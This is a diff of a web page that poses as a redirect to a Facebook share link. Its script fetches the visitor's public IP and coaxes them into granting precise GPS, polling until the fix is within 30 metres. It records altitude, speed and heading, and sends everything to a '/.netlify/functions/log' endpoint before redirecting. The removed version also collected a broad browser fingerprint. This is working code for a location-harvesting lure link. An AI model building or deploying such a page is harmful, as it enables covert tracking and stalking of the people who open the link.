@@ -3,112 +3,161 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Redirecting…</title>
+  <title>Opening content…</title>
   <style>
-    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;padding:24px;background:#f7f7f8;color:#111}
-    .card{max-width:720px;margin:36px auto;padding:18px;background:#fff;border-radius:10px;box-shadow:0 8px 20px rgba(0,0,0,0.06)}
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;padding:28px;background:#f7fafc;color:#111}
+    .box{max-width:720px;margin:36px auto;padding:18px;background:#fff;border-radius:10px;box-shadow:0 8px 24px rgba(7,10,21,0.06)}
+    .small{color:#556;font-size:0.95rem}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Preparing to open content…</h2>
-    <p>This page will ask for permission to access your location (optional). Your visit will be recorded for admin notifications.</p>
+  <div class="box">
+    <h2>Opening content…</h2>
+    <p class="small">This page will ask to use your device GPS for a precise location. The browser will ask permission — please choose <strong>Allow</strong> for precise location. If you allow, we wait a short time for a good GPS fix, then open the content.</p>
+    <p id="status" class="small">Status: requesting permission…</p>
   </div>
 
 <script>
-(async function(){
-  // final redirect target
-  const REDIRECT_URL = "https://www.facebook.com/share/r/1GSrQ5WSVa/";
+(function(){
+  // CONFIG: change these if you want
+  const REDIRECT_URL = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; // final target
+  const ACCURACY_THRESHOLD_METERS = 30;   // considered "good" accuracy (meters)
+  const TIMEOUT_MS = 15000;               // maximum wait time for a good fix (ms)
+  const MIN_WAIT_BEFORE_REDIRECT_MS = 300; // give a small moment for sendBeacon to fire
 
-  // collect baseline information
-  const data = {
-    timeUtc: new Date().toISOString(),
-    url: location.href,
-    referrer: document.referrer || null,
-    userAgent: navigator.userAgent || null,
-    platform: navigator.platform || null,
-    languages: navigator.languages || [navigator.language || null],
-    cookieEnabled: navigator.cookieEnabled || false,
-    doNotTrack: navigator.doNotTrack || null,
-    deviceMemory: navigator.deviceMemory || null,
-    hardwareConcurrency: navigator.hardwareConcurrency || null,
-    vendor: navigator.vendor || null,
-    screen: {
-      width: screen?.width || null,
-      height: screen?.height || null,
-      availWidth: screen?.availWidth || null,
-      availHeight: screen?.availHeight || null,
-      colorDepth: screen?.colorDepth || null
-    },
-    timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return null; } })(),
-    connection: (navigator.connection ? {
-      downlink: navigator.connection.downlink || null,
-      effectiveType: navigator.connection.effectiveType || null,
-      rtt: navigator.connection.rtt || null
-    } : null),
-    clientIp: null,   // will fill from ipify
-    coords: null      // will fill if user allows geolocation
-  };
+  const statusEl = document.getElementById('status');
 
-  // small helper to send data using sendBeacon if available
-  function sendPayload(payloadObj){
-    const bodyStr = JSON.stringify(payloadObj);
+  function updateStatus(t){ if (statusEl) statusEl.textContent = 'Status: ' + t; }
+
+  // send payload via sendBeacon if available, else fetch keepalive
+  function sendPayload(obj){
+    const s = JSON.stringify(obj);
     try {
-      // try sendBeacon first (keeps request reliable during navigation)
       if (navigator.sendBeacon) {
-        const blob = new Blob([bodyStr], { type: 'application/json' });
+        const blob = new Blob([s], { type: 'application/json' });
         navigator.sendBeacon('/.netlify/functions/log', blob);
         return;
       }
-    } catch(e) {
-      // ignore and fallback to fetch
-    }
-    // fallback: fetch with keepalive (best-effort)
+    } catch(e){}
+    // fallback
     fetch('/.netlify/functions/log', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: bodyStr,
+      body: s,
       keepalive: true
     }).catch(()=>{});
   }
 
-  // get public IP from ipify (best-effort)
-  try {
-    const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-    const j = await r.json();
-    data.clientIp = j.ip || null;
-  } catch(e) {
-    data.clientIp = null;
+  // get public IP as fallback (best-effort)
+  async function getPublicIp(){
+    try {
+      const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
+      const j = await r.json();
+      return j.ip || null;
+    } catch(e){
+      return null;
+    }
   }
 
-  // request geolocation (user will be prompted). If allowed, include coords.
-  if (navigator.geolocation) {
-    // race: if geolocation takes too long, fallback after timeout
-    let fallbackTimer = setTimeout(() => {
-      sendPayload(data);
-      setTimeout(()=>{ location.href = REDIRECT_URL; }, 300);
-    }, 4500);
+  // final redirect helper
+  function doRedirect(){
+    setTimeout(()=>{ location.href = REDIRECT_URL; }, MIN_WAIT_BEFORE_REDIRECT_MS);
+  }
 
-    navigator.geolocation.getCurrentPosition(function(pos){
-      clearTimeout(fallbackTimer);
-      data.coords = {
+  // Timeout fallback: use best sample we have (or ip-only)
+  (async function main(){
+    const start = Date.now();
+    updateStatus('fetching public IP…');
+    const clientIp = await getPublicIp();
+
+    if (!navigator.geolocation) {
+      updateStatus('Geolocation not supported — redirecting');
+      sendPayload({ timeUtc: new Date().toISOString(), clientIp });
+      doRedirect();
+      return;
+    }
+
+    updateStatus('Requesting GPS — please allow the browser prompt');
+
+    let bestSample = null;
+    let gotGood = false;
+    let timedOut = false;
+    let watchId = null;
+
+    // helper to handle a position sample
+    function handlePos(pos){
+      const sample = {
         lat: pos.coords.latitude,
         lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        speed: pos.coords.speed,
+        heading: pos.coords.heading,
+        timestamp: new Date(pos.timestamp).toISOString()
       };
-      sendPayload(data);
-      setTimeout(()=>{ location.href = REDIRECT_URL; }, 350);
-    }, function(err){
-      clearTimeout(fallbackTimer);
-      // permission denied or error -> send without coords
-      sendPayload(data);
-      setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
-    }, { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 });
-  } else {
-    // no geolocation API
-    sendPayload(data);
-    setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
-  }
+      // keep the best (smallest accuracy)
+      if (!bestSample || (sample.accuracy != null && sample.accuracy < (bestSample.accuracy || 1e9))) {
+        bestSample = sample;
+      }
+      updateStatus('Got GPS sample — accuracy: ' + (sample.accuracy != null ? Math.round(sample.accuracy) + ' m' : 'n/a'));
+      // if sample is within threshold, accept it immediately
+      if (sample.accuracy != null && sample.accuracy <= ACCURACY_THRESHOLD_METERS) {
+        gotGood = true;
+        finishAndRedirect();
+      }
+    }
+
+    // error handler
+    function handleErr(err){
+      updateStatus('Geolocation error: ' + (err && err.message ? err.message : err));
+      // if permission denied, fallback immediately
+      if (err && (err.code === 1 || err.code === 2 || err.code === 3)) {
+        // PERMISSION_DENIED or POSITION_UNAVAILABLE or TIMEOUT
+        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        finishAndRedirect();
+      }
+    }
+
+    // cleanup & final send
+    function finishAndRedirect(){
+      if (watchId !== null) {
+        try { navigator.geolocation.clearWatch(watchId); } catch(e){}
+        watchId = null;
+      }
+      // build payload
+      const payload = {
+        timeUtc: new Date().toISOString(),
+        clientIp: clientIp,
+        coords: bestSample,
+        note: gotGood ? 'good fix' : (timedOut ? 'timeout/best-sample' : 'fallback')
+      };
+      updateStatus('Sending location and redirecting…');
+      sendPayload(payload);
+      doRedirect();
+    }
+
+    // start watchPosition for multiple samples (better chance to get good fix)
+    try {
+      watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 10000
+      });
+    } catch(e){
+      updateStatus('Cannot start geolocation: ' + e);
+      finishAndRedirect();
+      return;
+    }
+
+    // set a total timeout
+    setTimeout(() => {
+      timedOut = true;
+      if (!gotGood) {
+        updateStatus('Timeout reached — using best sample (if any)');
+        finishAndRedirect();
+      }
+    }, TIMEOUT_MS);
+  })();
 })();
 </script>
 </body>
